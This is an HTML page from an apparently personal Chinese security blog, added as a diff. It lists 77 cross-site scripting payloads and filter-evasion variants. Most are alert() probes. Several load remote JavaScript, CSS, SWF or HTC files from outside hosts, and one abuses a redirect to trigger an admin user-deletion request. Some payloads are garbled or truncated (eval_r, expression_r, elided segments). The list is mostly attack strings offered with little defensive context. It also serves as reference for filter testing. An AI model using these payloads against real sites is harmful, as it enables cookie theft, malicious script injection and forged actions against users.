@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>XSS跨站脚本攻击汇总 | oneplusone&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的. 比如获取用户的Cookie，导航到恶意网站,携带木马等!
+
+                            XSS跨站脚本攻击汇总
+(1)普通的XSS J">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站脚本攻击汇总">
+<meta property="og:url" content="http://yoursite.com/2015/12/25/XSS/index.html">
+<meta property="og:site_name" content="oneplusone's blog">
+<meta property="og:description" content="XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的. 比如获取用户的Cookie，导航到恶意网站,携带木马等!
+
+                            XSS跨站脚本攻击汇总
+(1)普通的XSS J">
+<meta property="og:updated_time" content="2015-12-25T09:38:46.646Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS跨站脚本攻击汇总">
+<meta name="twitter:description" content="XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的. 比如获取用户的Cookie，导航到恶意网站,携带木马等!
+
+                            XSS跨站脚本攻击汇总
+(1)普通的XSS J">
+  
+    <link rel="alternative" href="/atom.xml" title="oneplusone&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">oneplusone&#39;s blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">天行健，君子以自强不息</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/12/25/XSS/" class="article-date">
+  <time datetime="2015-12-25T08:04:32.000Z" itemprop="datePublished">2015-12-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XSS跨站脚本攻击汇总
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>  XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网<br>页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执<br>行，从而达到攻击者的目的. 比如获取用户的Cookie，导航到恶意网站,携带木马等!</p>
+</blockquote>
+<pre><code>                            XSS跨站脚本攻击汇总
+(1)普通的XSS JavaScript注入
+&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
+
+(2)IMG标签XSS使用JavaScript命令
+&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
+
+(3)IMG标签无分号无引号
+&lt;IMG SRC=javascript:alert(‘XSS’)&gt;
+
+(4)IMG标签大小写不敏感
+&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;
+
+(5)HTML编码(必须有分号)
+&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
+
+(6)修正缺陷IMG标签
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+
+(7)formCharCode标签(计算器)
+&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+
+(8)UTF-8的Unicode编码(计算器)
+&lt;IMG SRC=jav..省略..S&apos;)&gt;
+
+(9)7位的UTF-8的Unicode编码是没有分号的(计算器)
+&lt;IMG SRC=jav..省略..S&apos;)&gt;
+
+(10)十六进制编码也是没有分号(计算器)
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+
+(11)嵌入式标签,将Javascript分开
+&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
+
+(12)嵌入式编码标签,将Javascript分开
+&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
+
+(13)嵌入式换行符
+&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
+
+(14)嵌入式回车
+&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
+
+(15)嵌入式多行注入JavaScript,这是XSS极端的例子
+&lt;IMG SRC=&quot;javascript:alert(‘XSS‘)&quot;&gt;
+
+(16)解决限制字符(要求同页面)
+&lt;script&gt;z=’document.’&lt;/script&gt;
+&lt;script&gt;z=z+’write(&quot;‘&lt;/script&gt;
+&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;
+&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;
+&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;
+&lt;script&gt;z=z+’w.shell’&lt;/script&gt;
+&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;
+&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;
+&lt;script&gt;z=z+’ript&gt;&quot;)’&lt;/script&gt;
+&lt;script&gt;eval_r(z)&lt;/script&gt;
+
+(17)空字符
+perl -e ‘print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;’ &gt; out
+
+(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用
+perl -e ‘print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;’ &gt; out
+
+(19)Spaces和meta前的IMG标签
+&lt;IMG SRC=&quot;   javascript:alert(‘XSS’);&quot;&gt;
+
+(20)Non-alpha-non-digit XSS
+&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(21)Non-alpha-non-digit XSS to 2
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+
+(22)Non-alpha-non-digit XSS to 3
+&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(23)双开括号
+&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+
+(24)无结束脚本标记(仅火狐等浏览器)
+&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;
+
+(25)无结束脚本标记2
+&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;
+
+(26)半开的HTML/JavaScript XSS
+&lt;IMG SRC=&quot;javascript:alert(‘XSS’)&quot;
+
+(27)双开角括号
+&lt;iframe src=http://3w.org/XSS.html &lt;
+
+(28)无单引号 双引号 分号
+&lt;SCRIPT&gt;a=/XSS/
+alert(a.source)&lt;/SCRIPT&gt;
+
+(29)换码过滤的JavaScript
+\&quot;;alert(‘XSS’);//
+
+(30)结束Title标签
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
+
+(31)Input Image
+&lt;INPUT SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;
+
+(32)BODY Image
+&lt;BODY BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
+
+(33)BODY标签
+&lt;BODY(‘XSS’)&gt;
+
+(34)IMG Dynsrc
+&lt;IMG DYNSRC=&quot;javascript:alert(‘XSS’)&quot;&gt;
+
+(35)IMG Lowsrc
+&lt;IMG LOWSRC=&quot;javascript:alert(‘XSS’)&quot;&gt;
+
+(36)BGSOUND
+&lt;BGSOUND SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;
+
+(37)STYLE sheet
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(‘XSS’);&quot;&gt;
+
+(38)远程样式表
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;
+
+(39)List-style-image(列表式)
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(‘XSS’)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+
+(40)IMG VBscript
+&lt;IMG SRC=’vbscript:msgbox(&quot;XSS&quot;)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+
+(41)META链接url
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(‘XSS’);&quot;&gt;
+
+(42)Iframe
+&lt;IFRAME SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;&lt;/IFRAME&gt;
+
+(43)Frame
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;&lt;/FRAMESET&gt;
+
+(44)Table
+&lt;TABLE BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
+
+(45)TD
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
+
+(46)DIV background-image
+&lt;DIV STYLE=&quot;background-image: none)&quot;&gt;
+
+(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)
+&lt;DIV STYLE=&quot;background-image: none)&quot;&gt;
+
+(48)DIV expression
+&lt;DIV STYLE=&quot;width: expression_r(alert(‘XSS’));&quot;&gt;
+
+(49)STYLE属性分拆表达
+&lt;IMG STYLE=&quot;xss:expression_r(alert(‘XSS’))&quot;&gt;
+
+(50)匿名STYLE(组成:开角号和一个字母开头)
+&lt;XSS STYLE=&quot;xss:expression_r(alert(‘XSS’))&quot;&gt;
+
+(51)STYLE background-image
+&lt;STYLE&gt;.XSS{background-image:none&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+
+(52)IMG STYLE方式
+exppression(alert(&quot;XSS&quot;))’&gt;
+
+(53)STYLE background
+&lt;STYLE&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(‘XSS’)&quot;)}&lt;/STYLE&gt;
+
+(54)BASE
+&lt;BASE HREF=&quot;javascript:alert(‘XSS’);//&quot;&gt;
+
+(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS
+&lt;EMBED SRC=&quot;http://3w.org/XSS/xss.swf&quot; &gt;&lt;/EMBED&gt;
+
+(56)在flash中使用ActionScrpt可以混进你XSS的代码
+a=&quot;get&quot;;
+b=&quot;URL(\&quot;&quot;;
+c=&quot;javascript:&quot;;
+d=&quot;alert(‘XSS’);\&quot;)&quot;;
+eval_r(a+b+c+d);
+
+(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上
+&lt;HTML xmlns:xss&gt;
+&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://3w.org/XSS/xss.htc&quot;&gt;
+&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+&lt;/HTML&gt;
+
+(58)如果过滤了你的JS你可以在图片里添加JS代码来利用
+&lt;SCRIPT SRC=&quot;&quot;&gt;&lt;/SCRIPT&gt;
+
+(59)IMG嵌入式命令,可执行任意命令
+&lt;IMG SRC=&quot;http://www.XXX.com/a.php?a=b&quot;&gt;
+
+(60)IMG嵌入式命令(a.jpg在同服务器)
+Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser
+
+(61)绕符号过滤
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(62)
+&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(63)
+&lt;SCRIPT a=&quot;&gt;&quot; &quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(64)
+&lt;SCRIPT &quot;a=’&gt;’&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(65)
+&lt;SCRIPT a=`&gt;` SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(66)
+&lt;SCRIPT a=&quot;&gt;’&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(67)
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+
+(68)URL绕行
+&lt;A HREF=&quot;http://127.0.0.1/&quot;&gt;XSS&lt;/A&gt;
+
+(69)URL编码
+&lt;A HREF=&quot;http://3w.org&quot;&gt;XSS&lt;/A&gt;
+
+(70)IP十进制
+&lt;A HREF=&quot;http://3232235521″&gt;XSS&lt;/A&gt;
+
+(71)IP十六进制
+&lt;A HREF=&quot;http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;
+
+(72)IP八进制
+&lt;A HREF=&quot;http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;
+
+(73)混合编码
+&lt;A HREF=&quot;h
+tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
+
+(74)节省[http:]
+&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+
+(75)节省[www]
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+
+(76)绝对点绝对DNS
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+
+(77)javascript链接
+&lt;A HREF=&quot;javascript:document.location=’http://www.google.com/’&quot;&gt;XSS&lt;/A&gt;
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/12/25/XSS/" data-id="ciilee73x0002qgfwbc75sepl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2015/12/25/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          欢迎来到博客
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/12/25/sqlmap/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sqlmap用法指南</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2015/12/25/hello-world/">欢迎来到博客</a>
+          </li>
+        
+          <li>
+            <a href="/2015/12/25/XSS/">XSS跨站脚本攻击汇总</a>
+          </li>
+        
+          <li>
+            <a href="/2015/12/25/sqlmap/">sqlmap用法指南</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2015 oneplusone<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+
+  </div>
+</body>
+</html>
